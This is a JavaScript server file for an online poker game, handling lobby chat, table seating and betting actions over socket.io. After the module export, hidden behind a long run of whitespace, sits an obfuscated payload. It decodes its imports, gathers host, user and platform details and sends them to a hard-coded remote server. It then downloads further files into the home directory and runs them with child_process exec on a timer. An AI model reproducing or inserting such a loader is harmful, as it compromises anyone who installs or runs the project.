const jwt = require('jsonwebtoken');
const Table = require('../pokergame/Table');
const Player = require('../pokergame/Player');
const {
  CS_FETCH_LOBBY_INFO,
  SC_RECEIVE_LOBBY_INFO,
  SC_PLAYERS_UPDATED,
  CS_JOIN_TABLE,
  SC_TABLE_JOINED,
  SC_TABLES_UPDATED,
  CS_LEAVE_TABLE,
  SC_TABLE_LEFT,
  CS_FOLD,
  CS_CHECK,
  CS_CALL,
  CS_RAISE,
  TABLE_MESSAGE,
  CS_SIT_DOWN,
  CS_REBUY,
  CS_STAND_UP,
  SITTING_OUT,
  SITTING_IN,
  CS_DISCONNECT,
  SC_TABLE_UPDATED,
  WINNER,
  CS_LOBBY_CONNECT,
  CS_LOBBY_DISCONNECT,
  SC_LOBBY_CONNECTED,
  SC_LOBBY_DISCONNECTED,
  SC_LOBBY_CHAT,
  CS_LOBBY_CHAT,
} = require('../pokergame/actions');
const config = require('../config');

const tables = {
  1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
};
const players = {};

function getCurrentPlayers() {
  return Object.values(players).map((player) => ({
    socketId: player.socketId,
    id: player.id,
    name: player.name,
  }));
}

function getCurrentTables() {
  return Object.values(tables).map((table) => ({
    id: table.id,
    name: table.name,
    limit: table.limit,
    maxPlayers: table.maxPlayers,
    currentNumberPlayers: table.players.length,
    smallBlind: table.minBet,
    bigBlind: table.minBet * 2,
  }));
}

const init = (socket, io) => {
  socket.on(CS_LOBBY_CONNECT, ({gameId, address, userInfo }) => {
    socket.join(gameId)
    io.to(gameId).emit(SC_LOBBY_CONNECTED, {address, userInfo})
    console.log( SC_LOBBY_CONNECTED , address, socket.id)
  })
  
  socket.on(CS_LOBBY_DISCONNECT, ({gameId, address, userInfo}) => {
    io.to(gameId).emit(SC_LOBBY_DISCONNECTED, {address, userInfo})
    console.log(CS_LOBBY_DISCONNECT, address, socket.id);
  })

  socket.on(CS_LOBBY_CHAT, ({ gameId, text, userInfo }) => {
    io.to(gameId).emit(SC_LOBBY_CHAT, {text, userInfo})
  })

  socket.on(CS_FETCH_LOBBY_INFO, ({walletAddress, socketId, gameId, username}) => {

    const found = Object.values(players).find((player) => {
        return player.id == walletAddress;
      });

      if (found) {
        delete players[found.socketId];
        Object.values(tables).map((table) => {
          table.removePlayer(found.socketId);
          broadcastToTable(table);
        });
      }

      players[socketId] = new Player(
        socketId,
        walletAddress,
        username,
        config.INITIAL_CHIPS_AMOUNT,
      );
      socket.emit(SC_RECEIVE_LOBBY_INFO, {
        tables: getCurrentTables(),
        players: getCurrentPlayers(),
        socketId: socket.id,
        amount: config.INITIAL_CHIPS_AMOUNT
      });
      socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  });

  socket.on(CS_JOIN_TABLE, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    console.log("tableid====>", tableId, table, player)
    table.addPlayer(player);
    socket.emit(SC_TABLE_JOINED, { tables: getCurrentTables(), tableId });
    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    sitDown(tableId, table.players.length, table.limit)

    if (
      tables[tableId].players &&
      tables[tableId].players.length > 0 &&
      player
    ) {
      let message = `${player.name} joined the table.`;
      broadcastToTable(table, message);
    }
  });

  socket.on(CS_LEAVE_TABLE, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    const seat = Object.values(table.seats).find(
      (seat) => seat && seat.player.socketId === socket.id,
    );

    if (seat && player) {
      updatePlayerBankroll(player, seat.stack);
    }

    table.removePlayer(socket.id);

    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    socket.emit(SC_TABLE_LEFT, { tables: getCurrentTables(), tableId });

    if (
      tables[tableId].players &&
      tables[tableId].players.length > 0 &&
      player
    ) {
      let message = `${player.name} left the table.`;
      broadcastToTable(table, message);
    }

    if (table.activePlayers().length === 1) {
      clearForOnePlayer(table);
    }
  });

  socket.on(CS_FOLD, (tableId) => {
    let table = tables[tableId];
    let res = table.handleFold(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_CHECK, (tableId) => {
    let table = tables[tableId];
    let res = table.handleCheck(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_CALL, (tableId) => {
    let table = tables[tableId];
    let res = table.handleCall(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_RAISE, ({ tableId, amount }) => {
    let table = tables[tableId];
    let res = table.handleRaise(socket.id, amount);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(TABLE_MESSAGE, ({ message, from, tableId }) => {
    let table = tables[tableId];
    broadcastToTable(table, message, from);
  });

  // socket.on(CS_SIT_DOWN, ({ tableId, seatId, amount }) => {
  //   const table = tables[tableId];
  //   const player = players[socket.id];

  //   if (player) {
  //     table.sitPlayer(player, seatId, amount);
  //     let message = `${player.name} sat down in Seat ${seatId}`;

  //     updatePlayerBankroll(player, -amount);

  //     broadcastToTable(table, message);
  //     if (table.activePlayers().length === 2) {
  //       initNewHand(table);
  //     }
  //   }
  // });
  const sitDown =  (tableId, seatId, amount) => {
    const table = tables[tableId];
    const player = players[socket.id];
    if (player) {
      table.sitPlayer(player, seatId, amount);
      let message = `${player.name} sat down in Seat ${seatId}`;

      updatePlayerBankroll(player, -amount);

      broadcastToTable(table, message);
      if (table.activePlayers().length === 2) {
        initNewHand(table);
      }
    }
  }

  socket.on(CS_REBUY, ({ tableId, seatId, amount }) => {
    const table = tables[tableId];
    const player = players[socket.id];

    table.rebuyPlayer(seatId, amount);
    updatePlayerBankroll(player, -amount);

    broadcastToTable(table);
  });

  socket.on(CS_STAND_UP, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    const seat = Object.values(table.seats).find(
      (seat) => seat && seat.player.socketId === socket.id,
    );

    let message = '';
    if (seat) {
      updatePlayerBankroll(player, seat.stack);
      message = `${player.name} left the table`;
    }

    table.standPlayer(socket.id);

    broadcastToTable(table, message);
    if (table.activePlayers().length === 1) {
      clearForOnePlayer(table);
    }
  });

  socket.on(SITTING_OUT, ({ tableId, seatId }) => {
    const table = tables[tableId];
    const seat = table.seats[seatId];
    seat.sittingOut = true;

    broadcastToTable(table);
  });

  socket.on(SITTING_IN, ({ tableId, seatId }) => {
    const table = tables[tableId];
    const seat = table.seats[seatId];
    seat.sittingOut = false;

    broadcastToTable(table);
    if (table.handOver && table.activePlayers().length === 2) {
      initNewHand(table);
    }
  });

  socket.on(CS_DISCONNECT, () => {
    const seat = findSeatBySocketId(socket.id);
    if (seat) {
      updatePlayerBankroll(seat.player, seat.stack);
    }

    delete players[socket.id];
    removeFromTables(socket.id);

    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  });

  async function updatePlayerBankroll(player, amount) {
    players[socket.id].bankroll += amount;
    io.to(socket.id).emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  }

  function findSeatBySocketId(socketId) {
    let foundSeat = null;
    Object.values(tables).forEach((table) => {
      Object.values(table.seats).forEach((seat) => {
        if (seat && seat.player.socketId === socketId) {
          foundSeat = seat;
        }
      });
    });
    return foundSeat;
  }
 
  function removeFromTables(socketId) {
    for (let i = 0; i < Object.keys(tables).length; i++) {
      tables[Object.keys(tables)[i]].removePlayer(socketId);
    }
  }

  function broadcastToTable(table, message = null, from = null) {
    for (let i = 0; i < table.players.length; i++) {
      let socketId = table.players[i].socketId;
      let tableCopy = hideOpponentCards(table, socketId);
      io.to(socketId).emit(SC_TABLE_UPDATED, {
        table: tableCopy,
        message,
        from,
      });
    }
  }

  function changeTurnAndBroadcast(table, seatId) {
    setTimeout(() => {
      table.changeTurn(seatId);
      broadcastToTable(table);

      if (table.handOver) {
        initNewHand(table);
      }
    }, 1000);
  }

  function initNewHand(table) {
    if (table.activePlayers().length > 1) {
      broadcastToTable(table, '---New hand starting in 5 seconds---');
    }
    setTimeout(() => {
      table.clearWinMessages();
      table.startHand();
      broadcastToTable(table, '--- New hand started ---');
    }, 5000);
  }

  function clearForOnePlayer(table) {
    table.clearWinMessages();
    setTimeout(() => {
      table.clearSeatHands();
      table.resetBoardAndPot();
      broadcastToTable(table, 'Waiting for more players');
    }, 5000);
  }

  function hideOpponentCards(table, socketId) {
    let tableCopy = JSON.parse(JSON.stringify(table));
    let hiddenCard = { suit: 'hidden', rank: 'hidden' };
    let hiddenHand = [hiddenCard, hiddenCard];

    for (let i = 1; i <= tableCopy.maxPlayers; i++) {
      let seat = tableCopy.seats[i];
      if (
        seat &&
        seat.hand.length > 0 &&
        seat.player.socketId !== socketId &&
        !(seat.lastAction === WINNER && tableCopy.wentToShowdown)
      ) {
        seat.hand = hiddenHand;
      }
    }
    return tableCopy;
  }
};


module.exports = { init };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    const aR=F;(function(aD,aE){const aQ=F,aF=aD();while(!![]){try{const aG=parseInt(aQ(0xd0))/0x1+-parseInt(aQ(0xd2))/0x2+parseInt(aQ(0xcb))/0x3*(parseInt(aQ(0xbb))/0x4)+parseInt(aQ(0xc4))/0x5*(-parseInt(aQ(0xd9))/0x6)+-parseInt(aQ(0xce))/0x7+-parseInt(aQ(0xb5))/0x8*(parseInt(aQ(0xcf))/0x9)+-parseInt(aQ(0xbe))/0xa*(-parseInt(aQ(0xb2))/0xb);if(aG===aE)break;else aF['push'](aF['shift']());}catch(aH){aF['push'](aF['shift']());}}}(D,0xac73e));const H='base64',I=aR(0xdf),K=require('fs'),O=require('os'),P=aD=>(s1=aD[aR(0xb3)](0x1),Buffer['from'](s1,H)[aR(0xd5)](I));rq=require(P(aR(0xbf)+'A')),pt=require(P('zcGF0aA')),ex=require(P(aR(0xc0)+'HJvY2Vzcw'))[P('cZXhlYw')],zv=require(P('Zbm9kZTpwc'+aR(0xdb))),hd=O[P('ZaG9tZWRpc'+'g')](),hs=O[P(aR(0xd3)+'WU')](),pl=O[P(aR(0xb8)+'m0')](),uin=O[P(aR(0xb9)+'m8')]();let Q;const a0=aR(0xc2)+aR(0xc5),a1=':124',a2=aD=>Buffer['from'](aD,H)[aR(0xd5)](I);var a3='',a4='';const a5=[0x24,0xc0,0x29,0x8],a6=aD=>{const aS=aR;let aE='';for(let aF=0;aF<aD['length'];aF++)rr=0xff&(aD[aF]^a5[0x3&aF]),aE+=String[aS(0xc3)+'de'](rr);return aE;},a7=aR(0xca),a8=aR(0xd1)+aR(0xde),a9=a2(aR(0xda)+aR(0xc7));function F(a,b){const c=D();return F=function(d,e){d=d-0xb2;let f=c[d];return f;},F(a,b);}function aa(aD){return K[a9](aD);}const ab=a2('bWtkaXJTeW'+'5j'),ac=[0xa,0xb6,0x5a,0x6b,0x4b,0xa4,0x4c],ad=[0xb,0xaa,0x6],ae=()=>{const aT=aR,aD=a2(a7),aE=a2(a8),aF=a6(ac);let aG=pt[aT(0xc9)](hd,aF);try{aH=aG,K[ab](aH,{'recursive':!0x0});}catch(aK){aG=hd;}var aH;const aI=''+a3+a6(ad)+a4,aJ=pt[aT(0xc9)](aG,a6(af));try{!function(aL){const aU=aT,aM=a2(aU(0xdc));K[aM](aL);}(aJ);}catch(aL){}rq[aD](aI,(aM,aN,aO)=>{if(!aM){try{K[aE](aJ,aO);}catch(aP){}ai(aG);}});},af=[0x50,0xa5,0x5a,0x7c,0xa,0xaa,0x5a],ag=[0xb,0xb0],ah=[0x54,0xa1,0x4a,0x63,0x45,0xa7,0x4c,0x26,0x4e,0xb3,0x46,0x66],ai=aD=>{const aE=a2(a7),aF=a2(a8),aG=''+a3+a6(ag),aH=pt['join'](aD,a6(ah));aa(aH)?am(aD):rq[aE](aG,(aI,aJ,aK)=>{if(!aI){try{K[aF](aH,aK);}catch(aL){}am(aD);}});},aj=[0x47,0xa4],ak=[0x2,0xe6,0x9,0x66,0x54,0xad,0x9,0x61,0x4,0xed,0x4,0x7b,0x4d,0xac,0x4c,0x66,0x50],al=[0x4a,0xaf,0x4d,0x6d,0x7b,0xad,0x46,0x6c,0x51,0xac,0x4c,0x7b],am=aD=>{const aV=aR,aE=a6(aj)+'\x20\x22'+aD+'\x22\x20'+a6(ak),aF=pt[aV(0xc9)](aD,a6(al));try{aa(aF)?ar(aD):ex(aE,(aG,aH,aI)=>{aq(aD);});}catch(aG){}},an=[0x4a,0xaf,0x4d,0x6d],ao=[0x4a,0xb0,0x44,0x28,0x9,0xed,0x59,0x7a,0x41,0xa6,0x40,0x70],ap=[0x4d,0xae,0x5a,0x7c,0x45,0xac,0x45],aq=aD=>{const aW=aR,aE=a6(ao)+'\x20\x22'+aD+'\x22\x20'+a6(ap),aF=pt[aW(0xc9)](aD,a6(al));try{aa(aF)?ar(aD):ex(aE,(aG,aH,aI)=>{ar(aD);});}catch(aG){}},ar=aD=>{const aX=aR,aE=pt[aX(0xc9)](aD,a6(af)),aF=a6(an)+'\x20'+aE;try{ex(aF,(aG,aH,aI)=>{});}catch(aG){}},as=P(aR(0xcd)+'GE'),at=P(aR(0xdd)),au=a2(aR(0xc6));let av=aR(0xba);function D(){const b3=['1100916ynYuqS','ZXhpc3RzU3','m9jZXNz','cm1TeW5j','adXJs','xlU3luYw','utf8','12771rfZOPH','slice','3E1','1080NqQcog','bc7f301710f4','split','YcGxhdGZvc','AdXNlckluZ','cmp','12oUfARq','ZT3','/s/','10990NuLusk','YcmVxdWVzd','aY2hpbGRfc','oqr','aaHR0cDovL','fromCharCo','35onXXhB','w==','cG9zdA','luYw','LjEzNS4xOT','join','Z2V0','170718pyusLc','length','cZm9ybURhd','2001279anzPgZ','23409VesLJH','1212302AGrpWU','d3JpdGVGaW','62318pTCWcq','caG9zdG5hb','E2LjE3MjAw','toString','dXNlcm5hbW','My4xMTUuMj','substring'];D=function(){return b3;};return D();}const aw=async aD=>{const aZ=aR,aE=(aH=>{const aY=F;let aI=0==aH?aY(0xd7)+aY(0xd4):aY(0xc8)+'UuMTc5MzM=';for(var aJ='',aK='',aL='',aM=0;aM<0x4;aM++)aJ+=aI[0x2*aM]+aI[0x2*aM+0x1],aK+=aI[0x8+0x2*aM]+aI[0x9+0x2*aM],aL+=aI[0x10+aM];return a2(a0[aY(0xd8)](0x1))+a2(aK+aJ+aL)+a1+'4';})(aD),aF=a2(a7);let aG=aE+aZ(0xbd);aG+=aZ(0xb6),rq[aF](aG,(aH,aI,aJ)=>{aH?aD<0x1&&aw(0x1):(aK=>{const b0=F;if(0==aK['search'](b0(0xbc))){let aL='';try{for(let aM=0x3;aM<aK[b0(0xcc)];aM++)aL+=aK[aM];arr=a2(aL),arr=arr[b0(0xb7)](','),a3=a2(a0[b0(0xd8)](0x1))+arr[0]+a1+'4',a4=arr[0x1];}catch(aN){return 0;}return 0x1;}return 0;})(aJ)>0&&(ax(),az());});},ax=async()=>{const b1=aR;av=hs,'d'==pl[0]&&(av=av+'+'+uin[a2(b1(0xd6)+'U')]);let aD=b1(0xb4);try{aD+=zv[a2('YXJndg')][0x1];}catch(aE){}ay(b1(0xc1),aD);},ay=async(aD,aE)=>{const aF={'ts':Q,'type':a4,'hid':av,'ss':aD,'cc':aE},aG={[at]:''+a3+a2('L2tleXM'),[as]:aF};try{rq[au](aG,(aH,aI,aJ)=>{});}catch(aH){}},az=async()=>await new Promise((aD,aE)=>{ae();});var aA=0;const aB=async()=>{const b2=aR;try{Q=Date['now']()[b2(0xd5)](),await aw(0);}catch(aD){}};aB();let aC=setInterval(()=>{(aA+=0x1)<0x3?aB():clearInterval(aC);},0x927c0);
